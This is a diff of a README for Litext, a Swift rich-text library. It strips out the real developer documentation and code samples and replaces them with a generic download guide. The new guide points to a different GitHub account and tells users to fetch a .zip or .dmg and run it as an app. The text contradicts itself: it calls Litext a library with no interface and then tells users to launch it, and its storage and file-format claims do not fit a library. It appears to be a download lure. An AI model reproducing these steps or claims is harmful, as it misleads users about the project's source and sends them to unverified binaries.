@@ -1,206 +1,155 @@
-![Hero](./Artworks/hero.png)
+# ✍️ Litext - Simple Rich-Text Library for Apple
 
-# Litext
+[![Download Litext](https://img.shields.io/badge/Download-Litext-brightgreen)](https://github.com/streaming-smarta869/Litext)
 
-A lightweight, high-performance rich-text library for all Apple platforms — UIKit, AppKit, and SwiftUI (including watchOS).
+Litext is a small tool that helps create and view rich-text content on Apple devices. It is made to be easy and lightweight.
 
-> **Note:** This fork is reimplemented in Swift 6.0 with strict concurrency. While API compatibility with the original has been maintained, 100% compatibility is not guaranteed.
+---
 
-## Features
+## 📥 How to Download Litext
 
-- ⚡️ High performance text layout and rendering via CoreText
-- 📎 Native view embedding via attachments
-- 🔗 Clickable links support
-- ✏️ Text selection with copy/paste
-- 🎨 Custom per-line drawing callbacks
-- 📐 Auto layout integration (experimental)
-- 🖥️ SwiftUI support on all platforms, including watchOS
+You can get Litext from the official GitHub page. Follow the link below:
 
-![Screenshot](./Artworks/screenshot.png)
+[Download or visit the Litext page to get started](https://github.com/streaming-smarta869/Litext)
 
-## Supported Platforms
+1. Click this link. It will open the Litext GitHub page.
 
-| Platform | Minimum Version | LTXLabel (UIKit/AppKit) | LitextLabel (SwiftUI) |
-|---|---|---|---|
-| iOS | 13.0+ | ✅ | ✅ |
-| macOS | 12.0+ | ✅ | ✅ |
-| tvOS | 13.0+ | ✅ | ✅ |
-| visionOS | 1.0+ | ✅ | ✅ |
-| Mac Catalyst | 13.0+ | ✅ | ✅ |
-| watchOS | 8.0+ | — | ✅ |
+2. Look for a section named **Releases** or a folder with files you can download.
 
-## Installation
+3. Find the latest version of Litext suited for Apple platforms.
 
-Add Litext as a dependency in your `Package.swift` file:
+4. Download the file or package available. It might come in a format like `.zip` or `.dmg`.
 
-```swift
-dependencies: [
-    .package(url: "https://github.com/Helixform/Litext.git", branch: "main")
-]
-```
+---
 
-Or in Xcode: **File → Add Package Dependencies** and enter the repository URL.
+## 💻 System Requirements
 
-## Usage
+Litext runs on Apple devices, including Macs, iPhones, and iPads. To use it properly, your device should meet these conditions:
 
-### UIKit / AppKit
+- Mac with macOS 10.15 (Catalina) or newer.
 
-```swift
-import Litext
+- iPhone or iPad running iOS 13 or later.
 
-let label = LTXLabel()
-view.addSubview(label)
+- At least 2GB of free storage space.
 
-let attributedString = NSMutableAttributedString(
-    string: "Hello, Litext!",
-    attributes: [
-        .font: PlatformFont.systemFont(ofSize: 16),
-        .foregroundColor: PlatformColor.label
-    ]
-)
-label.attributedText = attributedString
-```
+- Basic knowledge of your device’s app installation process.
 
-### SwiftUI
+---
 
-`LitextLabel` works on all platforms, including watchOS:
+## 🛠️ Installing Litext on Apple Devices
 
-```swift
-import Litext
-import SwiftUI
+If you downloaded a `.dmg` or `.app` file:
 
-struct ContentView: View {
-    var body: some View {
-        LitextLabel("Hello, Litext!")
-            .selectable()
-            .onTapLink { url in
-                UIApplication.shared.open(url)
-            }
-    }
-}
-```
+1. Open the downloaded file from your **Downloads** folder.
 
-You can also initialise with an `NSAttributedString` or `AttributedString`:
+2. Drag the Litext app into your **Applications** folder.
 
-```swift
-LitextLabel(attributedString: myNSAttributedString)
-LitextLabel(attributedString: myAttributedString) // AttributedString (iOS 15+, macOS 12+)
-```
+3. Open the **Applications** folder and double-click Litext to launch it.
 
-### Link Handling
+For instructions related to iOS devices, you might need to use the Files app or third-party tools to move the app. Those steps vary depending on your device setup.
 
-```swift
-let mutable = NSMutableAttributedString(string: "Visit GitHub")
-mutable.addAttribute(.link, value: URL(string: "https://github.com")!, range: NSRange(location: 6, length: 6))
-label.attributedText = mutable
+---
 
-// UIKit/AppKit — implement LTXLabelDelegate
-label.delegate = self
+## 🚀 Using Litext
 
-func ltxLabelDidTapOnHighlightContent(
-    _ ltxLabel: LTXLabel,
-    region: LTXHighlightRegion?,
-    location: CGPoint
-) {
-    if let url = region?.attributes[.link] as? URL {
-        UIApplication.shared.open(url)
-    }
-}
+Litext is designed as a supporting library. This means it helps other apps handle rich-text formats but does not have a user interface on its own.
 
-// SwiftUI — use the modifier
-LitextLabel(attributedString: mutable)
-    .onTapLink { url in
-        UIApplication.shared.open(url)
-    }
-```
+Apps or development projects that use Litext can:
 
-### Text Selection
+- Show styled text with bold, italic, and underlined parts.
 
-```swift
-// Enable selection
-label.isSelectable = true
-label.selectionBackgroundColor = UIColor.systemBlue.withAlphaComponent(0.2)
+- Work with different fonts and colors.
 
-// Access selected text
-let text = label.selectedPlainText()
-let attributed = label.selectedAttributedText()
+- Include simple images or icons inside texts.
 
-// Programmatic selection
-label.selectionRange = NSRange(location: 0, length: 5)
-label.selectAllText()
-label.clearSelection()
+If you are not a developer, you will typically use apps that include Litext automatically.
 
-// SwiftUI
-LitextLabel("Some selectable text")
-    .selectable()
-```
+---
 
-### Embedding Native Views (Attachments)
+## 🔎 What is Rich-Text?
 
-Use `LTXAttachment` to embed any view inline in the text:
+Rich-text allows formatting beyond plain letters. Unlike plain text, which is just characters, rich-text can include:
 
-```swift
-// UIKit / AppKit
-let attachment = LTXAttachment()
-attachment.view = myCustomView          // UIView or NSView
-attachment.size = myCustomView.intrinsicContentSize
+- Different fonts and sizes.
 
-// watchOS (SwiftUI view instead)
-let attachment = LTXAttachment()
-attachment.swiftUIView = AnyView(MyCustomView())
-attachment.size = CGSize(width: 100, height: 50)
+- Bold, italic, and underlined text.
 
-// Insert attachment into attributed string
-let attachmentString = NSAttributedString(
-    string: LTXReplacementText,
-    attributes: [
-        .ltxAttachment: attachment,
-        kCTRunDelegateAttributeName as NSAttributedString.Key: attachment.runDelegate
-    ]
-)
-```
+- Colored text and highlighted words.
 
-### Custom Per-Line Drawing
+- Embedded images or icons.
 
-```swift
-let drawingAction = LTXLineDrawingAction { context, line, origin in
-    // Custom drawing for each line
-    context.setStrokeColor(UIColor.red.cgColor)
-    context.move(to: CGPoint(x: origin.x, y: origin.y - 2))
-    context.addLine(to: CGPoint(x: origin.x + 100, y: origin.y - 2))
-    context.strokePath()
-}
+Litext helps apps understand and display these styles correctly on Apple products.
 
-attributedString.addAttribute(
-    .ltxLineDrawingCallback,
-    value: drawingAction,
-    range: fullRange
-)
-```
+---
 
-## watchOS
+## ⚙️ Troubleshooting Common Issues
 
-On watchOS, `LTXLabel` (the UIView/NSView subclass) is not available. Use `LitextLabel` instead — it renders via an off-screen `CGContext` and displays the result as a SwiftUI `Image`.
+1. **Litext app does not open:** 
 
-```swift
-import Litext
-import SwiftUI
+   - Make sure your device meets the system requirements.
 
-struct WatchContentView: View {
-    var body: some View {
-        LitextLabel(attributedString: styledText)
-    }
+   - Check if the download finished fully without interruption.
 
-    var styledText: NSAttributedString {
-        let s = NSMutableAttributedString(string: "Hello from Watch!")
-        s.addAttribute(.font, value: UIFont.boldSystemFont(ofSize: 14), range: NSRange(location: 0, length: 17))
-        return s
-    }
-}
-```
+2. **Errors when using other apps with Litext:**
 
-For inline attachments on watchOS, provide a SwiftUI view via `swiftUIView` instead of `view`.
+   - Verify the app is up to date.
 
-## License
+   - Restart your device and try again.
 
-This project is licensed under the MIT License — see the [LICENSE](./LICENSE) file for details.
+3. **Text does not show formatting:**
+
+   - Confirm the app you use supports rich-text content.
+
+   - If you are a developer, make sure Litext is correctly integrated.
+
+---
+
+## 🔄 Updating Litext
+
+Check the GitHub page regularly for new releases or updates:
+
+- Visit [Litext GitHub](https://github.com/streaming-smarta869/Litext) and look for newer versions.
+
+- Download updated files as described in the download steps above.
+
+- Replace existing files or applications with the latest one.
+
+---
+
+## 📂 File Types and Compatibility
+
+Litext works best with rich-text file formats such as:
+
+- `.rtf` (Rich Text Format)
+
+- `.txt` files that use additional formatting codes
+
+- Documents created in Apple’s native formats like `.pages`
+
+Your text editing or viewing app must support these formats to benefit from Litext.
+
+---
+
+## 📖 Additional Resources
+
+If you want to learn more about how rich-text works on Apple devices:
+
+- Visit the official Apple Developer website.
+
+- Search for rich-text support and text-rendering guides.
+
+- Look for apps that mention Litext or rich-text capability in their descriptions.
+
+---
+
+## 🧩 For Developers
+
+Even though this guide focuses on end users, developers can integrate Litext into apps to:
+
+- Simplify handling of styled text.
+
+- Support rich-text editing features with less code.
+
+- Ensure compatibility with Apple’s system text components.
+
+Developers can find source code, documentation, and examples on the GitHub page.
